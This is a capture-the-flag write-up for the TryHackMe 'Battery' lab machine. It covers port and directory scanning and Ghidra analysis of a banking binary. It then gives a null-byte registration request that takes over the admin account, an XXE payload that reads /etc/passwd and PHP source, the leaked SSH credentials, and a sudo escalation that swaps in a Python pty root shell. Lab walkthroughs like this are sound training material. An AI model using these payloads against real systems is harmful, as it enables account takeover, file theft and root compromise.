# 62 - Battery (Ghidra, SQLI Truncation attack, XML/XXE attack)

Room Link --> [https://tryhackme.com/room/battery](https://tryhackme.com/room/battery)

### Enumeration

{% code overflow="wrap" %}
```bash
nmap -Pn -n -vv 10.10.93.37 -p- -T4 -T5

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```
{% endcode %}

#### Dirsearch enum

{% code overflow="wrap" %}
```bash
gobuster dir -u http://10.10.93.37 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -b 403,404 -x html,php,db,txt,ini,sql

/index.html
/admin.php
/scripts
/forms.php
/report
/logout.php
/dashboard.php
/acc.php
/with.php
/tra.php
```
{% endcode %}

### Report Executable <a href="#report-executable" id="report-executable"></a>

Next I looked at [report](http://target.thm/report). This downloaded a file to my machine.

{% code overflow="wrap" %}
```bash
$ file report 
report: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=44ffe4e81d688f7b7fe59bdf74b03f828a4ef3fe, for GNU/Linux 3.2.0, not stripped

$ ./report 

Welcome To ABC DEF Bank Managemet System!
UserName : aa
Password : aa
Wrong username or password
```
{% endcode %}

The executable requires a username and password to login. I ran `strings` and found many emails. But nothing that looked like a password.

Let us try opening this file in ghidra.

<figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/iozzwn2/2022/12/ghidra-main.png" alt="" height="930" width="739"><figcaption></figcaption></figure>

In the main function, we can see that it compares the value which we enter with `guest`. So the username and password is `guest`. We can try running the binary file now but it does not contain anything useful.

What's interesting to us is the `users` function. It contains the email addresses of all registered users.

<figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/iozzwn2/2022/12/ghidra-users-1.png" alt="" height="431" width="577"><figcaption></figcaption></figure>

You can also get this list by logging into the binary file using the creds which we found.

There is another function named `update` which can be used to update the password of any user.

<figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/iozzwn2/2022/12/ghidra-update.png" alt="" height="414" width="583"><figcaption></figcaption></figure>

From the code we can see that only the admin can update the password for other users which means this is most probably the email address of the user admin.

### Exploitation

I tried creating an admin user with the email `admin@bank.a`, but adding lots of spaces at the end. Hoping that MySQL might truncate it and then I would have an admin user. But that failed to.

At some point, I tried creating the admin user with a null byte at the end.

```
POST /register.php HTTP/1.1
Host: target.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Origin: http://target.thm
Connection: close
Referer: http://target.thm/register.php
Cookie: PHPSESSID=bfaakggtf5869ke4ie1ktuqgt7
Upgrade-Insecure-Requests: 1

uname=admin%40bank.a%00&bank=a&password=admin&btn=Register+me%21
```

And this worked. The server was using an old version of PHP.&#x20;

Now we can login using the username `admin@bank.a` and password `password`

I went directly the the ‘command’ tab to try the XXE injection.

<figure><img src=".gitbook/assets/image (408).png" alt=""><figcaption></figcaption></figure>

### XXE Injection

{% code overflow="wrap" lineNumbers="true" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace SYSTEM "/etc/passwd"> ]><root>
    <name>
        123
    </name>
    <search>
        &toreplace;
    </search>
</root>
```
{% endcode %}

And i was able to read the /etc/passwd file.

<figure><img src=".gitbook/assets/image (409).png" alt=""><figcaption></figcaption></figure>

From there I tried to read `.ssh/id_rsa` on both users. I checked for `flag.txt` or `user.txt` also. Then I tried reading the Apache logs. They all came back empty.

Next I tried to get the PHP files. I had to get them as Base64 to extract them.

<figure><img src=".gitbook/assets/image (410).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (411).png" alt=""><figcaption></figcaption></figure>

We see a MySQL creds here, But MySQL is not exposed externally, so its useless.

Tried couple of .php files. Non were interesting except `acc.php`&#x20;

<figure><img src=".gitbook/assets/image (412).png" alt=""><figcaption></figcaption></figure>

It gave SSH credentials: `cyber : super#secure&password!`  and it worked.

<figure><img src=".gitbook/assets/image (413).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

`sudo -l` .

<figure><img src=".gitbook/assets/image (414).png" alt=""><figcaption></figcaption></figure>

We can't modify the file but it is in cyber home dir, meaning he can delete and replace it with a malicious python file, execute it as root and get root shell.

```bash
rm run.py
nano run.py

# contents
import pty

pty.spawn("/bin/bash")

chmod +x run.py
```

Now when we run as sudo we get root.

```bash
cyber@ubuntu:~$ sudo -u root /usr/bin/python3 /home/cyber/run.py
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# 


```

Done!

